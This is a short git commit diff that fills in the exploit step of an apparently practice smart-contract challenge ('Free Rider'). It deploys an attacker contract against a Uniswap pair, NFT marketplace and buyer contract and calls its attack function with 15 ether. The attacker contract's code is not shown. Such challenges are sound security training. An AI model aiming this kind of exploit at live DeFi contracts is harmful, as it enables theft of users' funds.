35f28c2707ed894a89c4f223e3b79e6b6e27f10d
ssghost <ssprof0@gmail.com>
2022-11-16 19:34:13 +0800

    solve freerider

--- test/free-rider/free-rider.challenge.js
+++ test/free-rider/free-rider.challenge.js
@@ -105,6 +105,14 @@ describe('[Challenge] Free Rider', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        attackerContract = await (await ethers.getContractFactory('FreeRiderAttacker', attacker))
+            .deploy(this.uniswapPair.address,
+                this.marketplace.address,
+                this.weth.address,
+                this.nft.address,
+                this.buyerContract.address);
+
+        await attackerContract.connect(attacker).attack(ethers.utils.parseEther('15'));
     });
 
     after(async function () {
